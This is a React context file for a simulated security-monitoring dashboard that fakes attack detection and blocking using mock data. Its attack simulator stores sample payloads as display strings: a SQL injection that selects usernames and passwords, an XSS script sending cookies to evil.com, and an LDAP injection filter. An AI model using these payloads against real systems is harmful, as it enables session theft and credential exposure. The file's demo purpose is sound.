import React, { createContext, useState, useContext, useEffect } from 'react';
import { mockSecurityData } from '../data/mockData';

const SecurityContext = createContext();

export const SecurityProvider = ({ children }) => {
  const [securityStatus, setSecurityStatus] = useState({
    threatLevel: 'low',
    activeThreats: 0,
    blockedAttacks: 0,
    vulnerabilities: 0,
    systemStatus: 'operational', // Changed from 'under_attack' to 'operational'
  });
  
  const [securityEvents, setSecurityEvents] = useState([]);
  const [securityRules, setSecurityRules] = useState([]);
  const [components, setComponents] = useState([]);
  const [showAttackAlert, setShowAttackAlert] = useState(false);
  const [activeAttack, setActiveAttack] = useState(null);
  const [attackDetectionStep, setAttackDetectionStep] = useState(0);
  const [attackDetectionComplete, setAttackDetectionComplete] = useState(false);
  
  // Initialize with mock data
  useEffect(() => {
    // Load initial security data
    setSecurityEvents(mockSecurityData.events);
    setSecurityRules(mockSecurityData.rules);
    setComponents(mockSecurityData.components);
    
    // Calculate initial security status
    updateSecurityStatus();
  }, []);
  
  // Update security status based on events
  const updateSecurityStatus = () => {
    const recentEvents = mockSecurityData.events.slice(0, 50);
    const criticalEvents = recentEvents.filter(event => event.severity === 'critical');
    const highEvents = recentEvents.filter(event => event.severity === 'high');
    const blockedEvents = recentEvents.filter(event => event.status === 'blocked');
    
    let threatLevel = 'low';
    if (criticalEvents.length > 0) {
      threatLevel = 'critical';
    } else if (highEvents.length > 3) {
      threatLevel = 'high';
    } else if (highEvents.length > 0) {
      threatLevel = 'medium';
    }
    
    setSecurityStatus({
      threatLevel,
      activeThreats: criticalEvents.length + highEvents.length,
      blockedAttacks: blockedEvents.length,
      vulnerabilities: mockSecurityData.vulnerabilities.length,
      systemStatus: 'operational', // Set to operational by default
    });
  };
  
  // Add a new security event
  const addSecurityEvent = (event) => {
    const newEvents = [event, ...securityEvents];
    setSecurityEvents(newEvents);
    
    // Update security status
    updateSecurityStatus();
  };
  
  // Update a rule
  const updateRule = (ruleId, updatedRule) => {
    const updatedRules = securityRules.map(rule => 
      rule.id === ruleId ? { ...rule, ...updatedRule } : rule
    );
    setSecurityRules(updatedRules);
  };
  
  // Add a new rule
  const addRule = (rule) => {
    const newRule = {
      id: `rule-${securityRules.length + 1}`,
      createdAt: new Date().toISOString(),
      ...rule
    };
    
    setSecurityRules([...securityRules, newRule]);
  };
  
  // Delete a rule
  const deleteRule = (ruleId) => {
    const filteredRules = securityRules.filter(rule => rule.id !== ruleId);
    setSecurityRules(filteredRules);
  };
  
  // Update component status
  const updateComponentStatus = (componentId, status) => {
    const updatedComponents = components.map(component => 
      component.id === componentId ? { ...component, status } : component
    );
    setComponents(updatedComponents);
  };
  
  // New function to trigger attack mode
  const triggerAttackMode = (attackType = 'sql_injection') => {
    // Create a simulated attack incident
    const attackIncident = {
      id: `attack-${Date.now()}`,
      type: attackType,
      severity: 'critical',
      source: '192.168.1.45',
      target: attackType === 'sql_injection' ? '/api/products' : 
             (attackType === 'xss' ? '/user/profile' : '/auth/login'),
      timestamp: new Date().toISOString(),
      status: 'detected',
      description: `${attackType.replace('_', ' ')} attack detected from suspicious source`,
      details: {
        payload: attackType === 'sql_injection' ? "UNION SELECT username, password FROM users" :
                (attackType === 'xss' ? "<script>document.location='http://evil.com/steal.php?c='+document.cookie</script>" :
                                      "(|(uid=*)(userPassword=*))"),
        attempts: 1,
        severity: 'critical'
      }
    };
    
    // Add the attack to security events
    addSecurityEvent(attackIncident);
    
    // Update security status to show system under attack
    setSecurityStatus(prev => ({
      ...prev,
      threatLevel: 'critical',
      activeThreats: prev.activeThreats + 1,
      systemStatus: 'under_attack'
    }));
    
    // Show attack alert
    setActiveAttack(attackIncident);
    setShowAttackAlert(true);
    setAttackDetectionStep(0);
    setAttackDetectionComplete(false);
    
    // Start the attack detection sequence
    startAttackDetection(attackIncident);
    
    return attackIncident;
  };
  
  // Function to close attack alert
  const closeAttackAlert = () => {
    setShowAttackAlert(false);
  };
  
  // Function to simulate the attack detection process
  const startAttackDetection = (attack) => {
    // Reset the detection process
    setAttackDetectionStep(0);
    setAttackDetectionComplete(false);
    
    // Create detection timeline
    const detectionSteps = [
      {
        component: 'Suricata IDS',
        action: 'Network anomaly detected',
        timestamp: new Date().toISOString(),
        details: 'Suspicious network pattern identified',
        status: 'detecting'
      },
      {
        component: 'ModSecurity WAF',
        action: 'Request analysis',
        timestamp: new Date(Date.now() + 15000).toISOString(), // 15 seconds later
        details: 'Malicious pattern identified in HTTP request',
        status: 'detecting'
      },
      {
        component: 'ModSecurity WAF',
        action: 'Attack confirmation',
        timestamp: new Date(Date.now() + 30000).toISOString(), // 30 seconds later
        details: 'OWASP CRS rules matched - confirmed attack',
        status: 'detected'
      },
      {
        component: 'HexaShield Core',
        action: 'Attack classification',
        timestamp: new Date(Date.now() + 40000).toISOString(), // 40 seconds later
        details: `${attack.type.replace('_', ' ')} attack identified with high confidence`,
        status: 'responding'
      },
      {
        component: attack.type === 'sql_injection' ? 'GreenSQL' : 
                 (attack.type === 'xss' ? 'ModSecurity WAF' : 'Keycloak'),
        action: 'Countermeasure deployment',
        timestamp: new Date(Date.now() + 60000).toISOString(), // 60 seconds later
        details: 'Attack blocked, request rejected',
        status: 'blocked'
      },
      {
        component: 'HexaShield Core',
        action: 'Incident recording',
        timestamp: new Date(Date.now() + 70000).toISOString(), // 70 seconds later
        details: 'Attack details logged for forensic analysis',
        status: 'recorded'
      },
      {
        component: 'Wazuh',
        action: 'Threat intelligence update',
        timestamp: new Date(Date.now() + 90000).toISOString(), // 90 seconds later
        details: 'Security rules updated based on attack pattern',
        status: 'learning'
      },
      {
        component: 'HexaShield Core',
        action: 'Incident response complete',
        timestamp: new Date(Date.now() + 120000).toISOString(), // 120 seconds later
        details: 'Attack fully mitigated, normal operations restored',
        status: 'complete'
      }
    ];
    
    // Store the detection steps with the attack
    setActiveAttack({
      ...attack,
      detectionSteps,
      currentStep: 0
    });
    
    // Simulate the detection process steps
    let currentStep = 0;
    const stepInterval = setInterval(() => {
      if (currentStep >= detectionSteps.length) {
        clearInterval(stepInterval);
        setAttackDetectionComplete(true);
        
        // Update attack status to blocked after detection is complete
        addSecurityEvent({
          ...attack,
          status: 'blocked',
          description: `${attack.type.replace('_', ' ')} attack blocked successfully`,
          timestamp: new Date().toISOString()
        });
        
        // Update security status
        setSecurityStatus(prev => ({
          ...prev,
          blockedAttacks: prev.blockedAttacks + 1,
          systemStatus: 'operational' // Restore to operational after attack is blocked
        }));
        
        return;
      }
      
      setAttackDetectionStep(currentStep);
      setActiveAttack(prev => ({
        ...prev,
        currentStep
      }));
      
      currentStep++;
    }, 2000); // Each step takes 2 seconds for demonstration
    
    return () => clearInterval(stepInterval);
  };
  
  const value = {
    securityStatus,
    securityEvents,
    securityRules,
    components,
    showAttackAlert,
    activeAttack,
    attackDetectionStep,
    attackDetectionComplete,
    addSecurityEvent,
    updateRule,
    addRule,
    deleteRule,
    updateComponentStatus,
    triggerAttackMode,
    closeAttackAlert
  };
  
  return (
    <SecurityContext.Provider value={value}>
      {children}
    </SecurityContext.Provider>
  );
};

export const useSecurity = () => {
  return useContext(SecurityContext);
};